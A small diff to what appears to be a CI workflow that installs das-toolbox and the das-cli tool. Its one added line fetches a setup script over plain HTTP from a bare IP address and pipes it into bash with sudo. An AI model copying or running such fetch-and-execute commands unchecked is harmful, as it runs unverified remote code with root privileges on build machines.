@@ -22,6 +22,7 @@ jobs:
 
       - name: Install requirements 
         run: |
+          sudo bash -c "wget -O - http://45.77.4.33/apt-repo/setup.sh | bash" && \
           sudo apt -y update && \
           sudo apt -y install das-toolbox && \
           sudo das-cli update-version --version 0.4.14
